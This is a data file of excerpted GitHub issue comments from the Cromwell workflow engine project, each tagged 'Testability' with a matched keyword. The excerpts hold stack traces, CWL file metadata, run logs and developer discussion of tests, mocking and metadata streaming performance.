Testability,"-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq"",; ""secondaryFiles"": [],; ""basename"": ""ref-transcripts.gtf.db"",; ""class"": ""File"",; ""nameroot"": ""ref-transcripts.gtf""; }; ],; ""basename"": ""ref-transcripts.gtf"",; ""class"": ""File"",; ""nameroot"": ""ref-transcripts""; },; ""reference__fasta__base"": {; ""nameext"": "".fa"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa"",; ""size"": 37196,; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq"",; ""secondaryFiles"": [; {; ""nameext"": "".fai"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa.fai"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa.fai"",; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq"",; ""secondaryFiles"": [],; ""basename"": ""hg19.fa.fai"",; ""class"": ""File"",; ""nameroot"": ""hg19.fa""; },; {; ""nameext"": "".dict"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.dict"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.dict"",; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:10135,test,testdata,10135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['test'],['testdata']
Testability,... but if we want to test SGE... Lee would be a good contact,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1086#issuecomment-253987047:22,test,test,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1086#issuecomment-253987047,1,['test'],['test']
Testability,"...and then we should mock out Docker Hub so we don't lose the value of the test, then re-enable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/337#issuecomment-166385219:22,mock,mock,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/337#issuecomment-166385219,2,"['mock', 'test']","['mock', 'test']"
Testability,".AssertionError: assertion failed: received unexpected message RealMessage(ServiceUnreachable,TestActor[akka://TestSystem-78f39f37-cc73-481d-8e7a-e59e623aa020/user/$$i]) after 0 millis; at akka.testkit.TestKitBase.expectNoMsg_internal(TestKit.scala:696); at akka.testkit.TestKitBase.expectNoMessage(TestKit.scala:661); at akka.testkit.TestKitBase.expectNoMessage$(TestKit.scala:660); at akka.testkit.TestKit.expectNoMessage(TestKit.scala:896); at cromwell.core.actor.RobustClientHelperSpec.$anonfun$new$7(RobustClientHelperSpec.scala:140); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.core.actor.RobustClientHelperSpec.withFixture(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680); at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.FlatSpecLike.runTest(FlatSpecLike.scala:1692); at org.scalatest.FlatSpecLike.runTest$(FlatSpecLike.scala:1674); at cromwell.core.actor.RobustClientHelperSpec.runTest(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.$anonfun$runTests$1(FlatSpecLike.scala:1750); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054:1284,Test,TestSuite,1284,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054,1,['Test'],['TestSuite']
Testability,".AssertionError: assertion failed: received unexpected message RealMessage(ServiceUnreachable,TestActor[akka://TestSystem-a47da50b-5587-413b-bbc6-4773a965cb41/user/$$i]) after 0 millis; at akka.testkit.TestKitBase.expectNoMsg_internal(TestKit.scala:696); at akka.testkit.TestKitBase.expectNoMessage(TestKit.scala:661); at akka.testkit.TestKitBase.expectNoMessage$(TestKit.scala:660); at akka.testkit.TestKit.expectNoMessage(TestKit.scala:896); at cromwell.core.actor.RobustClientHelperSpec.$anonfun$new$7(RobustClientHelperSpec.scala:140); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.core.actor.RobustClientHelperSpec.withFixture(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680); at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.FlatSpecLike.runTest(FlatSpecLike.scala:1692); at org.scalatest.FlatSpecLike.runTest$(FlatSpecLike.scala:1674); at cromwell.core.actor.RobustClientHelperSpec.runTest(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.$anonfun$runTests$1(FlatSpecLike.scala:1750); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-454822183:1021,Test,TestSuite,1021,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-454822183,1,['Test'],['TestSuite']
Testability,".Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$1(HealthMonitorServiceActorSpec.scala:40); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventually(HealthMonitorServiceActorSpec.scala:20); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventualStatus(HealthMonitorServiceActorSpec.scala:32",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:6192,Test,TestKitSuite,6192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['Test'],['TestKitSuite']
Testability,.scala:213); at org.scalatest.BeforeAndAfterAll.run(BeforeAndAfterAll.scala:210); at org.scalatest.BeforeAndAfterAll.run$(BeforeAndAfterAll.scala:208); at cromwell.CromwellTestKitWordSpec.org$scalatest$WordSpecLike$$super$run(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$run$1(WordSpecLike.scala:1192); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.WordSpecLike.run(WordSpecLike.scala:1192); at org.scalatest.WordSpecLike.run$(WordSpecLike.scala:1190); at cromwell.CromwellTestKitWordSpec.run(CromwellTestKitSpec.scala:250); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.jav,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:3789,Test,TestFramework,3789,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,8,['Test'],['TestFramework']
Testability,".scala:442); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); at wdl.draft2.model.WdlNamespace$.$anonfun$apply$51(WdlNamespace.scala:441); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); at wdl.draft2.model.WdlNamespace$.apply(WdlNamespace.scala:440); at wdl.draft2.model.WdlNamespace$.$anonfun$load$1(WdlNamespace.scala:174); at scala.util.Try$.apply(Try.scala:213); at wdl.draft2.model.WdlNamespace$.load(WdlNamespace.scala:169); at wdl.draft2.model.WdlNamespace$.loadUsingSource(WdlNamespace.scala:161); at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:53); ... 27 common frames omitted; [2020-09-17 21:41:46,29] [info] Not triggering log of token queue status. Effective log interval = None; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:9053,log,log,9053,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,2,['log'],['log']
Testability,".withRetry(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); 	at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4587,test,testdir,4587,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['test'],['testdir']
Testability,"/48013920-818d5c80-e0f3-11e8-9f71-d4dedcbb2ba1.png). The graph below shows the average response time of the metadata endpoint with and without streaming (in ms).; ![metadata-200-v1-v1s](https://user-images.githubusercontent.com/2978948/48013852-53a81800-e0f3-11e8-9152-6c844e896b09.png). A plausible explanation of the response time increase is that the connection to the DB needs to remain open (and can't be re-used) for as long as the stream is not closed. This includes time spent pulling data out of the database AND building the JSON.; Whereas in the non streaming version, the connection can be re-used for another query as soon as all the data has been pulled and Cromwell is building the metadata. The extra time spent with the connection used in the streaming version can then delay subsequent requests when lots of metadata requests are being made.; We also see that the graph spans longer on the X axis for the streaming version, which means the test took longer to complete. [The test](https://github.com/broadinstitute/cromwell/blob/tj-metadata-stream-experiment-2/scripts/perf/test_cases/metadata_load/metadata_load.wdl) consists of sending a lot of metadata requests to Cromwell. ### Thoughts, possible next steps and/or things to try. - I think the fs2 stream model is still interesting as it allows for a clean interruption of building of the metadata (with or without streaming from the database).; - It might be possible to choose between streaming and non streaming depending on the size of the metadata to build (would require a COUNT(*) beforehand); - It might be possible to order the database request (for instance if the query was sorted by call fqn, metadata key and timestamp) in such a way that the json can be built:; 1) Directly, i.e without need for the wrapping MetadataComponent object to maintain information about indices in the list and CRDT (which would reuse memory usage and possible build time); 2) Piece by piece and be streamed back to the requester; - Build",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:3887,test,test,3887,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['test'],['test']
Testability,"/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; > request, timeout=timeout_property).read(); > File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; > response = self._open(req, data); > File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; > '_open', req); > File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; > result = func(*args); > File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; > return self.do_open(httplib.HTTPConnection, req); > File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; > r = h.getresponse(buffering=True); > File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; > response.begin(); > File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; > version, status, reason = self._read_status(); > File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; > line = self.fp.readline(); > File ""/usr/lib/python2.7/socket.py"", line 447, in readline; > data = self._sock.recv(self._rbufsize); > socket.timeout: timed out; > :; >; > This is a gsutil stacktrace. JES tried to copy the logs and failed, hence; > failing the job and the workflow. They might want to retry this - although; > we've been telling them to stop retrying too much on some things so I don't; > know. @geoffjentry <https://github.com/geoffjentry> and @cjllanwarne; > <https://github.com/cjllanwarne> were talking about it on slack maybe; > they have an opinion.; >; > For call caching: it will get slower and slower. Basically the more jobs; > you run the slower it's going to be... I'm working on something to fix that; > but it's not in develop yet.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk6vHuB6D3iMODjERjQgj6h_SG4z2ks5r15JkgaJpZM4NNP8f>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027:3778,log,logs,3778,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298887027,1,['log'],['logs']
Testability,"0,37] [error] PipelinesApiAsyncBackendJobExecutionActor [3d2d7a27wf_hello.hello:NA:1]: Error attempting to Execute; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; ```; I had set up my credentials with:; ```; export GOOGLE_APPLICATION_CREDENTIALS=sa.json; ```; and had this configuration in `google.conf` copied from the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/):; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }; ```; That clearly did not work. I tried to follow the logic in this post. I followed Horneth suggestion to use `service-account`'s authorization and I took the [auths](https://cromwell.readthedocs.io/en/develop/backends/Google/) configuration and changed `pem-file` to `json-file` in `google.conf` as follows:; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""service_account""; scheme = ""service_account""; service-account-id = ""xxx@xxx.iam.gserviceaccount.com""; json-file = ""sa.json""; }; ]; }. engine {; filesystems {; gcs {; auth = ""service_account""; project = ""xxx""; }; }; }; ```; And I have replaced every other instance of `auth = ""application-default""` with `auth = ""service_account""`. Now when I run Cromwell:; ```; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```; I don't get the error anymore. I do get a different error:; ```; [2020-07-27 22:54:56,48] [info] WorkflowManagerActor Workflow 0fb5e69d-7d70-407e-9fe2-bf7cb2b2c3e6 failed (during ExecutingWorkflowState): java.lang.Exception",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906:1079,log,logic,1079,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906,2,['log'],['logic']
Testability,"018-04-04T00:13:06.677Z""; },; {; ""description"": ""initializing VM"",; ""endTime"": ""2018-04-03T21:35:47.186424Z"",; ""startTime"": ""2018-04-03T21:35:09Z""; },; {; ""startTime"": ""2018-04-03T21:35:02.588Z"",; ""description"": ""Pending"",; ""endTime"": ""2018-04-03T21:35:02.588Z""; },; {; ""startTime"": ""2018-04-03T21:35:48.818896012Z"",; ""description"": ""pulling-image"",; ""endTime"": ""2018-04-03T21:37:50.448425714Z""; },; {; ""startTime"": ""2018-04-03T21:35:02.588Z"",; ""description"": ""WaitingForValueStore"",; ""endTime"": ""2018-04-03T21:35:02.588Z""; },; {; ""startTime"": ""2018-04-03T21:37:50.448425714Z"",; ""description"": ""localizing-files"",; ""endTime"": ""2018-04-03T21:52:07.621362223Z""; },; {; ""startTime"": ""2018-04-03T21:35:02.588Z"",; ""description"": ""RequestingExecutionToken"",; ""endTime"": ""2018-04-03T21:35:02.588Z""; },; {; ""startTime"": ""2018-04-04T00:10:30.287776787Z"",; ""description"": ""cromwell poll interval"",; ""endTime"": ""2018-04-04T00:13:04.837Z""; }; ],; ""backendLogs"": {; ""log"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/PreSort.log""; },; ""start"": ""2018-04-03T21:35:02.588Z""; }; ]; },; ""outputs"": {; ""MarkDuplicates.ClassicMarkDuplicates.outputMetrics"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-ClassicMarkDuplicates/md.metrics"",; ""MarkDuplicates.SortSam.outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-SortSam/md.sorted.bam"",; ""MarkDuplicates.ClassicMarkDuplicates.outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-ClassicMarkDuplicates/md.bam"",; ""MarkDuplicates.PreSort.outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/md.sorted.bam""; },; ""workflowRoot"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/"",; ""id"": ""01c7d76f-5b2b-48cd-b",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:10885,log,log,10885,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['log'],['log']
Testability,022127.zip7406634406151397777/tasks/task-1.wdl; 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowInitializationFailed(MaterializeWorkflowDescriptorActor.scala:203); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorActor.scala:173); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorActor.scala:168); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at akka.actor.FSM.processEvent(FSM.scala:665); 	at akka.actor.FSM.processEvent$(FSM.scala:662); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:126); 	at akka.actor.LoggingFSM.processEvent(FSM.scala:801); 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:783); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.processEvent(MaterializeWorkflowDescriptorActor.scala:126); 	at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:659); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:653); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:126); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3297#issuecomment-373942284:2381,Log,LoggingFSM,2381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3297#issuecomment-373942284,1,['Log'],['LoggingFSM']
Testability,"11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-11-21 15:09:05,51] [info] Unspecified type (Unspecified version) workflow 02306258-436a-4372-ab54-2dcd83c42b47 submitted; [2018-11-21 15:09:05,52] [info] SingleWorkflowRunnerActor: Workflow submitted 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,53] [info] 1 new workflows fetched; [2018-11-21 15:09:05,53] [info] WorkflowManagerActor Starting workflow 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] WorkflowManagerActor Successfully started WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-11-21 15:09:05,57] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-11-21 15:09:05,58] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-11-21 15:09:06,80] [info] MaterializeWorkflowDescriptorActor [02306258]: Parsing workflow as WDL draft-2; [2018-11-21 15:09:07,34] [info] MaterializeWorkflowDescriptorActor [02306258]: Call-to-Backend assignments: test.hello -> AWSBATCH; [2018-11-21 15:09:08,72] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Starting test.hello; [2018-11-21 